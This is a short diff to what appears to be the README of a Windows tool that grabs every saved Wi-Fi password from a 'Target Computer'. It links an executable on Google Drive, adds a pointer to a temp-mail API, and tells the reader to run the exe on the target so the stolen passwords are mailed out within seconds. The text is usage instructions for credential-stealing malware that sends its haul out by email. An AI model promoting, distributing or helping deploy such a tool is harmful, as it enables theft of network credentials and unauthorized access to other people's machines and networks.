@@ -5,6 +5,10 @@ Get All Registered Wifi Passwords from Target Computer.
 
 **https://drive.google.com/open?id=1uCdDR673_W1n-SUoB78I_bYJgFr8WJB1**
 
+## USAGE TEMP MAIL API
+
+### https://temp-mail.org/en/api/
+
 Download and run exe file on Target Computer.The data will mail in 5-10 seconds.
 
 
